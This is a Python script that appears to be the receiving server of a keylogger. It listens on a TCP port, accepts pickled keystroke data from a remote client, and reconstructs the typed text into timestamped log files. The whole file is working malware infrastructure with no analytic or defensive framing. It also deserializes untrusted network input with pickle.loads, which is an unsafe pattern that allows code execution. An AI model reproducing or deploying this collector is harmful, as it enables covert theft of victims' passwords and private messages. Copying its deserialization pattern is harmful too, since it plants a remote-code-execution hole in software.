import socket
import pickle
import datetime
from sys import argv

header = 10

class Socket:

    connection = False

    def __init__(self, port):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((socket.gethostname(), port))
        self.listen_to_for_client()

    def listen_to_for_client(self):
        try:
            print("Listening...")
            self.socket.listen(1)
            self.connection, self.address = self.socket.accept()
            Socket.connection_established = True
            print(f"Connection established with {self.address}")
        except socket.timeout:
            Socket.connection_established = False


class Global_Variables:
    shift_pressed = False
    buffer_overflow = False


def write_to_log_file(character):
    with open("Logfile_not_structured.txt", "a+")as log_file:
        character = str(character)
        log_file.write(str(datetime.datetime.now()) + f"  {character}" + "\n")

    with open("Logfile_structured.txt", "a+")as log_file:
        if character == "Key.backspace":
            with open("Logfile_structured.txt", "r")as temp_log_file:
                temp = temp_log_file.read()
            with open("Logfile_structured.txt", "w")as temp_log_file:
                temp_log_file.write(temp[0:-1])

        elif character == "Key.shift":
            Global_Variables.shift_pressed = True

        elif character == "Key.space":
            log_file.write(" ")

        elif character == "Key.enter":
            log_file.write("\n")

        elif character == "Key.tab":
            log_file.write("\t")

        else:
            if Global_Variables.shift_pressed:
                log_file.write(character.capitalize())
                Global_Variables.shift_pressed = False

            else:
                log_file.write(character)


def main():
    if len(argv) <= 1:
        print("Please declare port for the server to listen on\nUsing default port 50000")
        port = 50000
    else:
        port = int(argv[1])

    connection = Socket(port)
    while True:
        if not Socket.connection_established:
            connection.listen_to_for_client()
        full_msg = b''
        new_msg = True
        while True:
            try:
                data_rec = connection.connection.recv(64)
                if new_msg:
                    msg_len = int(data_rec[:header])
                    new_msg = False
            except ConnectionResetError:
                print(f"Lost Connection to {connection.address}")
                Socket.connection_established = False
                break

            full_msg += data_rec
            if len(full_msg) - header == msg_len:
                full_msg = pickle.loads(full_msg[header:])
                print(full_msg)
                if type(full_msg) == list:
                    for char in full_msg:
                        write_to_log_file(char)
                if type(full_msg) == str:
                    write_to_log_file(full_msg)
                full_msg = b''
                new_msg = True



if __name__ == '__main__':
    main()